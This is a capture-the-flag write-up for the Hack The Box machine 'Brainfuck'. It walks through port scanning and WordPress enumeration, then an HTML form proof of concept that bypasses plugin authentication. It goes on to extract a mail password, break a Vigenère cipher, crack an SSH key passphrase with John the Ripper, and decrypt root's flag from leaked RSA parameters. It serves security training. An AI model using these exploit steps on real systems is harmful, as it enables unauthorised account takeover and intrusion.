# Brainfuck Writeup w/o Metasploit

![](https://miro.medium.com/max/589/1*V_l8yAtapsmpj5EQMjykAQ.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.17
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that five ports are open:

* **Port 22:** running OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
* **Port 25**: running Postfix smtpd
* **Port 110:** running Dovecot pop3d
* **Ports 143**: running Dovecot imapd
* **Ports 443:** running nginx 1.10.0

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-25 09:49 EST
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 09:50 (0:00:04 remaining)
Nmap scan report for 10.10.10.17
Host is up (0.043s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) TOP RESP-CODES USER AUTH-RESP-CODE PIPELINING UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS more have OK LITERAL+ ENABLE IMAP4rev1 AUTH=PLAINA0001 capabilities SASL-IR IDLE listed ID post-login Pre-login
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.02 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.17
```

No other ports are open. Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.17
```

We get back the following result showing that no ports are open.

![](https://miro.medium.com/max/603/1*xVLoPfU5qH0EkxfHjMwm8Q.png)

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

1. The version of SSH being used is not associated with any critical vulnerabilities, so port 22 is unlikely to be our point of entry. We’ll need credentials for this service.
2. Port 443 is running HTTPS. The index page gives us the title “Welcome to nginx!”. This is likely a configuration issue where the IP address doesn’t know what hostname it should map to in order to serve a specific site and so instead it’s serving the ngnix default page. To fix this issue we’ll need to first figure out the list of hostnames that resolve to this IP address and then add these hostnames to our /etc/hosts file. From the nmap scan, we get three possible hostnames: _brainfuck.htb_, _www.brainfuck.htb_ and _sup3rs3cr3t.brainfuck.htb_.
3. Ports 25, 143 and 110 are running mail protocols. We might need to find a valid email address to further enumerate these services.

## Enumeration <a id="c56e"></a>

Add the following hostnames to the /etc/hosts file on your attack machine.

```text
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb 
```

I always start off with enumerating HTTP first. In this case only port 443 is open so we’ll start there.

First, let’s visit the site brainfuck.htb. After adding a security exception, we get the following page.

![](https://miro.medium.com/max/1290/1*uBZcjukec6C3JayNeUtrvw.png)

This is a WordPress site and we all know that WordPress is associated with SO MANY vulnerabilities. However, before we run a WordPress vulnerability scanner on this site, let’s look at the certificate information to see if it leaks any useful information.

To do that, click on the lock icon &gt; _Show Connection Details_.

![](https://miro.medium.com/max/490/1*tzW9MOgUTKdHpF43241Hxg.png)

Then click _More Information_ &gt; _View Certificate &gt; Details_. There, we see that the Issuer field gives us the email address _orestis@brainfuck.htb_ that might be useful when enumerating the open mail protocol ports. This email can also be found on the website.

![](https://miro.medium.com/max/719/1*QR68ixAbUoS_L4m9lM4ipA.png)

Next, let’s run the WordPress vulnerability scanner on the site.

```text
wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>
```

* — url: The URL of the blog to scan.
* — disable-tls-checks: Disables SSL/TLS certificate verification.
* — api-token: The WPVulnDB API Token to display vulnerability data

The following is a summary of the results found by the wpscan.

* The WordPress version identified is 4.7.3.
* The identified version of WordPress contains 44 vulnerabilities.
* The WP Support Plus Responsive Ticket System plugin is installed.
* The identified version of WP Support Plus Responsive Ticket System plugin contains 4 vulnerabilities.

Out of all the vulnerabilities identified, one particular vulnerability does stand out.

```text
| [!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
 |     Fixed in: 8.0.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8949
 |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
```

I tried this vulnerability, however, it did not work out. So, let’s check if searchsploit generates any other vulnerabilities.

```text
searchsploit WP Support Plus Responsive Ticket System
```

We get back the following result.

![](https://miro.medium.com/max/1024/1*hHOalT9gd7Tt71t8Yj-XzQ.png)

Let’s look at the privilege escalation vulnerability.

![](https://miro.medium.com/max/901/1*FuyPbBpoq3KILosW-cwvmw.png)

According to the [documentation](https://www.exploit-db.com/exploits/41006), this vulnerability allows you to bypass authentication by logging in as anyone without knowing the password. You do however need a valid username for the attack to work. Therefore, let’s use wpscan to enumerate usernames.

```text
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

* — enumerate u: enumerates usernames.

We get back the following result.

![](https://miro.medium.com/max/693/1*oFCbC1_fHjFvRZ4YJzv_uw.png)

Both “_admin_” and “_administrator_” are valid usernames. Now that we have a valid username, let’s attempt to exploit the vulnerability.

## Gaining an Initial Foothold <a id="eb5f"></a>

Copy the POC code from the [vulnerability entry on searchsploit](https://www.exploit-db.com/exploits/41006) and save it in the file priv-esc.html. Change the URL to the name of the machine.

```text
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Get the location of the exploit file on the attack machine.

```text
pwd
```

Run it in the browser and login as administrator.

![](https://miro.medium.com/max/718/1*lnJ63NNJB861XeZAE00F4A.png)

Refresh the brainfuck.htb page and we’re logged in as administrator!

![](https://miro.medium.com/max/1185/1*oubRE_dfw9h0fyaZSlHl9g.png)

There doesn’t seem to be much functionality available for this user. Therefore, let’s try the ‘admin’ user next. Perform the same exploit again except with the username being ‘admin’.

![](https://miro.medium.com/max/1160/1*WyKHJp2o-HJVy9g0EM1TCw.png)

On the top tab click on _Brainfuck Ltd._ &gt; _Themes_. Then click on _Plugins &gt; Settings_ on the _Easy WP SMTP_ plugin_._ There, we find the SMTP configuration settings with the SMTP username and SMTP masked password.

![](https://miro.medium.com/max/631/1*Wj4-jBDO92ewbYG3tpe2MQ.png)

Right click on the password field and view page source.

![](https://miro.medium.com/max/729/1*jTG8eUYGpAKG_wlfPI5nFw.png)

The user’s password is kHGuERB29DNiNE. Let’s use the mail client Evolution to log into orestis’s email. If you don’t have Evolution installed on your kali, you can install it using the following command.

```text
sudo apt-get install evolution
```

Open up the Evolution mail client. Click on _File_ &gt; _New_ &gt; _Mail Account_. On the _Welcome_ page click _Next_. There, enter the name _orestis_ in the _Full Name_ field and _orestis@brainfuck.htb_ in the _Email Address_ field.

![](https://miro.medium.com/max/825/1*8cfk_zqsdwrVajKlxbmlQg.png)

Click _Next_. In the _Receiving Email_ window, add _brainfuck.htb_ as the _Server_, _143_ as the _Port_ and _orestis_ as the _Username_.

![](https://miro.medium.com/max/827/1*LWH8GoJ6cC1D_pbc9xuB-g.png)

Click _Next &gt; Next._ In the _Sending Email_ window, add _brainfuck.htb_ as the _Server_, _25_ as the _Port_ and _No encryption_ as the _Encryption method_.

![](https://miro.medium.com/max/832/1*O7O_-dNp-671U28OoVGYoA.png)

Click _Next_ &gt; _Next_. You’ll be prompted with an authentication request. Add the password _kHGuERB29DNiNE_ and click _OK_. Now we can see orestis’s mail!

![](https://miro.medium.com/max/1117/1*49MexmwK9EaX34SZfn1JMA.png)

The _Form Access Details_ email gives us another set of credentials.

![](https://miro.medium.com/max/600/1*q7VcbUijHJjh9z2Wt9VKVA.png)

Remember that in the enumeration phase, we had three hostnames that we added to our hosts file. Since the email mentions a “secret” forum, let’s check out the sup3rs3cr3t.brainfuck.htb website. On the website, when you click on Log In, you’re presented with a login page. Enter our newly found credentials there.

![](https://miro.medium.com/max/801/1*6WieDPUQ4ebBEW2DaME_aA.png)

We’re logged in as orestis! Click on the _SSH Access_ thread.

![](https://miro.medium.com/max/1178/1*a4wJVzPvdlsjwy6G5U10eQ.png)

Based on the comments made there, orestis seems to have lost his SSH key and wants the admin to send it to him on an encrypted thread. One other thing we notice is that orestis always signs his message with the “Orestis — Hacking for fun and profit” phrase.

![](https://miro.medium.com/max/1096/1*xJcgP9jfUteJvFsnz4Fs8g.png)

The encrypted thread orestis is referencing is the _Key_ thread.

![](https://miro.medium.com/max/857/1*ZZV91p34QU61Qe83GFHJbw.png)

There, you’ll notice that orestis’s comments are signed with the same message we saw above except the message is in encrypted form. However, with each comment, the generated cipher text for the phrase is different. Therefore, the admin might be using the [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) which is a variation of a Caesar substitution cipher that uses a keyword and repeats it until it matches the length of the plaintext. Then the equivalent letter of the keyword is used to encrypt its corresponding plaintext letter. Therefore, the same plaintext can generate multiple different cipher texts.

Since we do have the plaintext and its corresponding cipher text, we can deduce the key since this cipher is vulnerable to a known plaintext attack. This [page](https://crypto.stackexchange.com/questions/12195/find-the-key-to-a-vigen%C3%A8re-cipher-given-known-ciphertext-and-plaintext) explains it really well, therefore I won’t explain how to do it.

I wrote a python script to automate the process of finding the key.

```text
plaintext = "OrestisHackingforfunandprofit"
ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"
key = ""for i in range(len(plaintext)):
 num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97
 char_key = chr(num_key)
 key = key + char_keyprint key
```

The script loops through the cipher text string and takes each character in order and converts it to the integer representation of that character. Then it subtracts that value from the integer representation of the corresponding character in the plaintext string and applies the modulus of 26 since there are 26 alphabets. This gives you a value between 0 and 25 inclusive. However, since the “chr” function that turns an integer to its character value depends on the ASCII table where 97 represents “a”, 98 represents “b”, etc. I had to add 97 to the integer value. After it loops through the entire cipher text it prints the key.

Let’s run the script.

```text
python vigenere-key.py
```

We get back the following result.

```text
brainfuckmybrainfuckmybrainfu
```

As mentioned earlier, the Vigenère cipher uses a keyword and repeats it until it matches the length of the plaintext. Therefore, we can deduce that the key is _fuckmybrain_. Now that we have the key, we can use it to decrypt the admin’s statement using this [online tool](https://www.dcode.fr/vigenere-cipher).

```text
Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg :)mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr
```

We get back the following text.

```text
There you go you stupid fuck, I hope you remember your key password because I dont :)
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

We’re one step closer! We have a link to the RSA private key that seems to be encrypted since the admin mentions a “key password” in the comment. Visit the link to download the RSA key. We get back the following encrypted key.

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

Before we use John the Ripper \(JtR\) to crack the password used to encrypt the private key, we need to convert the file into JtR format. To do that I use the [sshng2john.py](https://github.com/stricture/hashstack-server-plugin-jtr/blob/master/scrapers/sshng2john.py) script.

```text
python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa > ~/Desktop/htb/brainfuck/ssh-key
```

Now we can use JtR to crack the password.

```text
john ssh-key --wordlist=/usr/share/wordlists/rockyou.txt
```

We get back the following result.

```text
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (/root/Desktop/htb/brainfuck/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:12 DONE (2019-12-26 16:53) 0.08223g/s 1179Kp/s 1179Kc/s 1179KC/sa6_123..*7¡Vamos!
Session completed
```

It cracked the password! Let’s use the key and password to SSH into orestis’s machine.

First change the permissions on the encrypted RSA private key.

```text
chmod 600 id_rsa
```

Then SSH into the machine.

```text
ssh -i id_rsa orestis@brainfuck.htb
```

We finally gained an initial foothold!

![](https://miro.medium.com/max/676/1*tm0f760_eE_He2ZNOLGBLQ.png)

Grab the user.txt flag.

![](https://miro.medium.com/max/470/1*Qp_AiRIKHm0FFQdpu3SAjA.png)

We need to escalate privileges.

## Privilege Escalation <a id="2617"></a>

List the files in orestis’s home directory.

```text
orestis@brainfuck:~$ ls -la
total 60
drwxr-xr-x 7 orestis orestis 4096 Apr 29  2017 .
drwxr-xr-x 3 root    root    4096 Apr 13  2017 ..
-rw------- 1 root    root       1 Dec 24  2017 .bash_history
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Apr 29  2017 .cache
drwxr-xr-x 3 root    root    4096 Apr 17  2017 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Apr 29  2017 .sage
drwx------ 2 orestis orestis 4096 Apr 17  2017 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
```

View the content of encrypt.sage.

```text
orestis@brainfuck:~$ cat encrypt.sage
nbits = 1024password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It seems to be performing RSA encryption. First, it opens the root.txt file and uses its value as a parameter in the encryption. The encrypted password is written in the output.txt file. It also logs parameters in the debug.txt file.

Parameters p, q and e are logged in the debug file which we have read/write access to. Since we have both p and q, we can calculate n=p\*q, phi=\(p-1\)\(q-1\). We also have c since it’s written in the output.txt file which we have read/write access to. So we can calculate m from the equation c = pow\(m,e,n\).

Instead of doing that by hand, someone already [wrote a script](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) for it. First modify the script to include our values.

```text
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, ydef main():p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182# compute n
    n = p * q# Compute phi(n)
    phi = (p - 1) * (q - 1)# Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = aprint( "n:  " + str(d) );# Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )# Added code
flag = hex(pt)
flag = str(flag[2:-1])
print flag.decode("hex")if __name__ == "__main__":
    main()
```

I also added code that converts the string to ASCII. Run the script.

```text
python rsa-attack.py
```

The output gives you the content of the root.txt file.

```text
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977pt: 246040520294013860499802969537842870790592458678809669442466628493415070037506ef****************************** #redacted
```

## Lessons Learned <a id="1468"></a>

To gain an initial foothold on the box we exploited five vulnerabilities.

1. A known vulnerability in the WordPress version that is being used to host the website. This could have been easily avoided if the patched version was installed.
2. A password saved in the SMTP configuration settings. Although the password is masked, the plaintext password can be easily viewed in the source code. If the configuration settings does not require that the password be saved on the website, then the user should clear the password and enter the password every time they use the service.
3. A password stored in plaintext in the email. Again, if it is necessary that the password be transmitted by email, the user should have been prompted to change the password upon the first login.
4. The forums used the Vigenère Cipher which is known to be vulnerable to a known plaintext attack. Since we had both the cipher text and the corresponding plaintext, we were able to figure out the encryption key.
5. A weak password was used to encrypt the RSA private key. Since the password was really weak, it only took JtR a couple of seconds to decrypt it. The user should have used a sufficiently long password that is difficult to crack. Similarly, the user should have used a password manager to store the RSA private key instead of having to ask the admin to post it on the website.

To escalate privileges I exploited one vulnerability.

1. A file that was executed by root was used to encrypt the root.txt file using the RSA algorithm. However, the file outputted the “p”, “q” and “e” parameters used in the RSA encryption and therefore we were able to decrypt the cipher text. So this technically exploited two vulnerabilities: \(1\) sensitive information disclosure of RSA parameters and \(2\) security misconfiguration that gave a non-privileged user the ability to read the debug.txt file which contained sensitive information.

